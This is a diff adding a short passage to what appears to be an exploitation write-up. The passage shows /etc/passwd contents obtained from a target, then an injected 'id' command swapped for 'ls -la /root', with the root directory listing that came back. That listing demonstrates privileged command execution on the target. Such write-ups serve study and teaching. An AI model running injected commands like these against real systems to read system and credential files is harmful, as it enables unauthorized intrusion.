@@ -1020,3 +1020,13 @@ gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologi
 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 _apt:x:100:65534::/nonexistent:/bin/false
 ```
+Modifying the `id` command to be `ls -la /root`, we get the following:
+```
+total 20
+drwx------ 1 root root 4096 Nov  5  2021 .
+drwxr-xr-x 1 root root 4096 Nov  5  2021 ..
+lrwxrwxrwx 1 root root    9 Nov  5  2021 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
+drwx------ 3 root root 4096 Nov  5  2021 .cache
+-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
+```
